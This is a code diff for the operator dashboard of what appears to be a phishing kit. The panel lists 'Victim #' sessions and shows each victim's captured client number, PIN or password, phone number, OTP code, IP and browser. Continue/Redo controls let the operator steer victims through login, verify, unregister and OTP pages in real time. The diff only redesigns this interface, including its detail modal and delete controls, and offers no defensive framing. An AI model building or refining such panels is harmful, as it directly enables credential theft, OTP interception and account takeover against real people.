@@ -34,26 +34,44 @@
     .icon-btn.continue{border-color:rgba(52,211,153,.3)}.icon-btn.continue:hover{background:rgba(52,211,153,.15)}
     .icon-btn.redo{border-color:rgba(251,113,133,.3)}.icon-btn.redo:hover{background:rgba(251,113,133,.15)}
     .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)}
-    .icon-btn.delete{border-color:rgba(251,113,133,.3)}.icon-btn.delete:hover{background:rgba(251,113,133,.15)}
     .cred{font-family:monospace;font-size:.8rem;background:#f1f1f1;padding:2px 4px;border-radius:3px;color:#000}
     .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
-    #modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(5px)}#modal .card{max-width:700px;width:90%;background:#111;border-color:#333;max-height:90vh;overflow-y:auto;padding:28px}
+    #modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(5px)}#modal .card{max-width:600px;width:90%;background:#111;border-color:#333;max-height:90vh;overflow-y:auto;padding:28px}
     #empty{text-align:center;color:#888;padding:2rem 0}
     @media(max-width:900px){.stats{grid-template-columns:1fr}}
 
+    /* Clean Modal Styles */
+    .modal-header{border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:16px;margin-bottom:20px}
+    .modal-title{font-size:20px;font-weight:600;margin:0;color:var(--text-primary)}
+    .modal-subtitle{font-size:13px;color:var(--text-muted);margin-top:4px}
+    
+    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px}
+    .info-section{background:rgba(255,255,255,0.02);border-radius:10px;padding:16px;border:1px solid rgba(255,255,255,0.05)}
+    .info-label{font-size:11px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:6px;font-weight:500}
+    .info-value{font-size:14px;color:var(--text-primary);font-weight:500}
+    .info-value.mono{font-family:monospace;font-size:13px;background:rgba(255,255,255,0.08);padding:4px 8px;border-radius:4px;display:inline-block;margin-top:2px}
+    .info-value.small{font-size:12px;color:var(--text-muted);word-break:break-all;line-height:1.4}
+    
+    .full-width{grid-column:1 / -1}
+    
     /* Activity Log Styles */
-    .activity-log{max-height:200px;overflow-y:auto;background:rgba(255,255,255,0.03);border-radius:8px;padding:12px;margin-top:12px}
-    .activity-item{padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:flex-start}
-    .activity-item:last-child{border-bottom:none}
-    .activity-time{font-size:11px;color:var(--text-muted);white-space:nowrap;margin-left:12px}
-    .activity-action{font-size:12px;color:var(--text-primary);font-weight:500}
-    .activity-detail{font-size:11px;color:var(--text-muted);margin-top:2px}
+    .activity-section{margin-top:20px;border-top:1px solid rgba(255,255,255,0.1);padding-top:20px}
+    .activity-title{font-size:12px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:12px;font-weight:600}
+    .activity-log{max-height:220px;overflow-y:auto;background:rgba(0,0,0,0.3);border-radius:8px;padding:12px;border:1px solid rgba(255,255,255,0.05)}
+    .activity-item{padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:flex-start}
+    .activity-item:last-child{border-bottom:none;padding-bottom:0}
+    .activity-item:first-child{padding-top:0}
+    .activity-meta{flex:1}
+    .activity-action{font-size:13px;color:var(--text-primary);font-weight:500;margin-bottom:2px}
+    .activity-detail{font-size:12px;color:var(--text-muted)}
+    .activity-time{font-size:11px;color:var(--text-muted);white-space:nowrap;margin-left:16px;font-family:monospace}
 
-    /* Modal Grid Layout */
-    .modal-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
-    .modal-grid .full-width{grid-column:1 / -1}
-    .modal-section{background:rgba(255,255,255,0.03);border-radius:8px;padding:16px;border:1px solid rgba(255,255,255,0.05)}
-    .modal-section h4{margin:0 0 12px 0;font-size:12px;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-muted);font-weight:600}
+    /* Delete Section */
+    .delete-section{margin-top:20px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.1);display:flex;justify-content:space-between;align-items:center}
+    .delete-info{font-size:12px;color:var(--text-muted)}
+    .btn-danger{background:rgba(251,113,133,.15);border-color:rgba(251,113,133,.4);color:var(--red);padding:8px 16px}
+    .btn-danger:hover{background:rgba(251,113,133,.25)}
+    .btn-secondary{background:rgba(255,255,255,.05);border-color:rgba(255,255,255,.1)}
 
     /* toast alerts */
     #alert-container{position:fixed;top:20px;right:20px;z-index:10000;display:flex;flex-direction:column;gap:10px;max-width:400px}
@@ -67,13 +85,6 @@
     .alert-error{border-left:3px solid var(--red)}.alert-error .alert-icon{background:rgba(251,113,133,.15);color:var(--red)}
     @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
     @keyframes fadeOut{to{opacity:0;transform:translateX(20px)}}
-
-    /* Delete confirmation */
-    .delete-confirm{background:rgba(251,113,133,.1);border:1px solid rgba(251,113,133,.3);border-radius:8px;padding:16px;margin-top:16px;text-align:center}
-    .delete-confirm p{margin:0 0 12px 0;font-size:13px;color:var(--text-primary)}
-    .btn-danger{background:rgba(251,113,133,.2);border-color:rgba(251,113,133,.4);color:var(--red)}
-    .btn-danger:hover{background:rgba(251,113,133,.3)}
-    .btn-secondary{background:rgba(255,255,255,.05);border-color:rgba(255,255,255,.1)}
   </style>
 </head>
 <body>
@@ -107,17 +118,18 @@
   <!-- detail modal -->
   <div id="modal" onclick="if(event.target===this)closeModal()">
     <div class="card">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px">
-        <h3 style="margin:0;font-size:18px">Session Details</h3>
-        <button onclick="closeModal()" class="btn" style="font-size:16px;padding:4px 12px">✕</button>
+      <div class="modal-header">
+        <div style="display:flex;justify-content:space-between;align-items:flex-start">
+          <div>
+            <h3 class="modal-title" id="modalTitle">Session Details</h3>
+            <div class="modal-subtitle" id="modalSubtitle">Victim #0 • Connected at --:--</div>
+          </div>
+          <button onclick="closeModal()" class="btn" style="font-size:18px;padding:4px 12px;line-height:1">✕</button>
+        </div>
       </div>
       
       <div id="modalBody">
         <!-- Content injected by JS -->
-      </div>
-      
-      <div id="modalActions" style="margin-top:20px;display:flex;gap:10px;justify-content:flex-end">
-        <!-- Actions injected by JS -->
       </div>
     </div>
   </div>
@@ -126,6 +138,7 @@
     let currentSid = null, jsonData = {}, lastSessions = new Map();
     const qs = s => document.querySelector(s);
     const fmt = t => new Date(t).toLocaleTimeString();
+    const fmtDate = t => new Date(t).toLocaleString();
 
     /* ----------  LIVE CLOCK  ---------- */
     function updateClock(){
@@ -161,39 +174,12 @@
       return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
-    /* ----------  ACTION BUTTONS (conditional)  ---------- */
+    /* ----------  ACTION BUTTONS (table row)  ---------- */
     function actionButtons(s){
-      // APPROVED → no buttons except view details
-      if (s.page==='success') {
-        return `<div style="display:flex;gap:6px">
-          <button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>
-        </div>`;
-      }
-
-      let html = '<div style="display:flex;gap:6px">';
-      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
-
-      /* -----  CURRENT-PAGE logic: buttons only after interaction on THIS page  ----- */
-      if (s.page==='index.html' && s.entered){
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      }
-      if (s.page==='verify.html' && s.phone){
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      }
-      if (s.page==='unregister.html' && s.unregisterClicked){
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-      }
-      if (s.page==='otp.html' && s.otp){
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      }
-      
-      // Always add delete button in actions
-      html += `<button class="icon-btn delete" onclick="confirmDelete('${s.sid}')" title="Delete Session"><img src="/images/trash-svgrepo-com.svg" style="filter:brightness(0) invert(1) sepia(1) saturate(5) hue-rotate(320deg)"></button>`;
-      
-      return html + '</div>';
+      // Only show view details button in table
+      return `<div style="display:flex;gap:6px">
+        <button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>
+      </div>`;
     }
 
     /* ----------  CHANGE DETECTION  ---------- */
@@ -265,87 +251,95 @@
       if(!s)return;
       currentSid = sid;
       
+      // Update header
+      qs('#modalTitle').textContent = `Victim #${s.victimNum}`;
+      qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
+      
       // Build activity log HTML
       const activityHtml = s.activityLog && s.activityLog.length ? 
-        s.activityLog.map(log => `
+        s.activityLog.slice().reverse().map(log => `
           <div class="activity-item">
-            <div>
+            <div class="activity-meta">
               <div class="activity-action">${log.action}</div>
               ${log.detail ? `<div class="activity-detail">${log.detail}</div>` : ''}
             </div>
             <div class="activity-time">${fmt(log.time)}</div>
           </div>
-        `).join('') : '<div style="color:var(--text-muted);font-size:12px;padding:8px">No activity recorded</div>';
+        `).join('') : '<div style="color:var(--text-muted);font-size:12px;padding:8px 0">No activity recorded</div>';
       
       qs('#modalBody').innerHTML = `
-        <div class="modal-grid">
-          <div class="modal-section">
-            <h4>Session Info</h4>
-            <div class="detail">Victim Number</div><div class="cred" style="font-size:16px;margin-bottom:8px">#${s.victimNum}</div>
-            <div class="detail">Session ID</div><div class="cred" style="word-break:break-all;font-size:11px">${s.sid}</div>
-            <div class="detail" style="margin-top:8px">Current Page</div><div style="font-weight:600;color:${s.page==='success'?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}</div>
-            <div class="detail" style="margin-top:8px">Connected At</div><div>${new Date(s.dateStr).toLocaleString()}</div>
+        <div class="info-grid">
+          <div class="info-section">
+            <div class="info-label">Session ID</div>
+            <div class="info-value mono" style="font-size:11px">${s.sid}</div>
           </div>
           
-          <div class="modal-section">
-            <h4>System Info</h4>
-            <div class="detail">IP Address</div><div class="cred">${s.ip}</div>
-            <div class="detail" style="margin-top:8px">Platform</div><div>${s.platform}</div>
-            <div class="detail" style="margin-top:8px">Browser</div><div>${s.browser}</div>
-            <div class="detail" style="margin-top:8px">User Agent</div><div style="font-size:10px;word-break:break-all;color:var(--text-muted)">${s.ua}</div>
+          <div class="info-section">
+            <div class="info-label">Current Page</div>
+            <div class="info-value" style="color:${s.page==='success'?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}</div>
           </div>
           
-          <div class="modal-section">
-            <h4>Credentials</h4>
-            <div class="detail">Client Number / Email</div><div class="cred">${s.email||'—'}</div>
-            <div class="detail" style="margin-top:8px">PIN / Password</div><div class="cred">${s.password||'—'}</div>
+          <div class="info-section">
+            <div class="info-label">Client Number</div>
+            <div class="info-value mono">${s.email||'—'}</div>
           </div>
           
-          <div class="modal-section">
-            <h4>Verification Data</h4>
-            <div class="detail">Phone Number</div><div class="cred">${s.phone||'—'}</div>
-            <div class="detail" style="margin-top:8px">OTP Code</div><div class="cred">${s.otp||'—'}</div>
-            <div class="detail" style="margin-top:8px">Unregister Clicked</div><div style="color:${s.unregisterClicked?'var(--green)':'var(--text-muted)'}">${s.unregisterClicked?'Yes':'No'}</div>
+          <div class="info-section">
+            <div class="info-label">PIN / Password</div>
+            <div class="info-value mono">${s.password||'—'}</div>
           </div>
           
-          <div class="modal-section full-width">
-            <h4>Activity Log</h4>
-            <div class="activity-log">${activityHtml}</div>
+          <div class="info-section">
+            <div class="info-label">Phone Number</div>
+            <div class="info-value mono">${s.phone||'—'}</div>
+          </div>
+          
+          <div class="info-section">
+            <div class="info-label">OTP Code</div>
+            <div class="info-value mono">${s.otp||'—'}</div>
+          </div>
+          
+          <div class="info-section full-width">
+            <div class="info-label">System Information</div>
+            <div style="display:grid;grid-template-columns:repeat(3, 1fr);gap:12px;margin-top:8px">
+              <div>
+                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Platform</div>
+                <div style="font-size:13px;font-weight:500">${s.platform}</div>
+              </div>
+              <div>
+                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Browser</div>
+                <div style="font-size:13px;font-weight:500">${s.browser}</div>
+              </div>
+              <div>
+                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Unregister</div>
+                <div style="font-size:13px;font-weight:500;color:${s.unregisterClicked?'var(--green)':'var(--text-muted)'}">${s.unregisterClicked?'Yes':'No'}</div>
+              </div>
+            </div>
+            <div style="margin-top:12px">
+              <div style="font-size:11px;color:var(--text-muted);margin-bottom:4px">User Agent</div>
+              <div class="info-value small">${s.ua}</div>
+            </div>
           </div>
         </div>
-      `;
-      
-      qs('#modalActions').innerHTML = `
-        <button class="btn btn-secondary" onclick="closeModal()">Close</button>
-        ${s.page !== 'success' ? `
-          <button class="btn" onclick="act('redo','${s.sid}');closeModal()" style="background:rgba(251,191,36,.15);border-color:rgba(251,191,36,.3);color:var(--yellow)">↻ Redo</button>
-          <button class="btn" onclick="act('cont','${s.sid}');closeModal()" style="background:rgba(52,211,153,.15);border-color:rgba(52,211,153,.3);color:var(--green)">→ Continue</button>
-        ` : ''}
-        <button class="btn btn-danger" onclick="showDeleteConfirm('${s.sid}')">🗑 Delete</button>
+        
+        <div class="activity-section">
+          <div class="activity-title">Activity Log (${s.activityLog ? s.activityLog.length : 0} events)</div>
+          <div class="activity-log">${activityHtml}</div>
+        </div>
+        
+        <div class="delete-section">
+          <div class="delete-info">Permanently remove this session from active sessions</div>
+          <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
+        </div>
       `;
       
       qs('#modal').style.display='flex';
     }
     
-    function showDeleteConfirm(sid){
-      const s = jsonData.sessions.find(x=>x.sid===sid);
-      qs('#modalBody').innerHTML = `
-        <div class="delete-confirm">
-          <p>Are you sure you want to delete <strong>Victim #${s.victimNum}</strong>?</p>
-          <p style="font-size:12px;color:var(--text-muted)">This will permanently remove the session from active sessions.</p>
-          <div style="display:flex;gap:10px;justify-content:center;margin-top:16px">
-            <button class="btn btn-secondary" onclick="showDetail('${sid}')">Cancel</button>
-            <button class="btn btn-danger" onclick="act('delete','${sid}');closeModal()">Yes, Delete</button>
-          </div>
-        </div>
-      `;
-      qs('#modalActions').innerHTML = '';
-    }
-    
     function confirmDelete(sid){
-      // Quick delete from table view (no confirmation)
-      if(confirm('Delete this session?')){
+      if(confirm('Are you sure you want to delete this session? This action cannot be undone.')){
         act('delete', sid);
+        closeModal();
       }
     }
     
@@ -357,7 +351,6 @@
     /* ----------  CONTROL  ---------- */
     async function act(action,sid){
       await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
-      if(qs('#modal').style.display==='flex')closeModal();
       load();
     }
 
@@ -372,7 +365,7 @@
     async function load(){
       const d = await fetch('/api/panel').then(r=>r.json());
       if(d.error)return location.replace('/panel');
-      jsonData = d; // Store for modal access
+      jsonData = d;
       checkChanges(d.sessions);
       render(d);
       setTimeout(load,300);
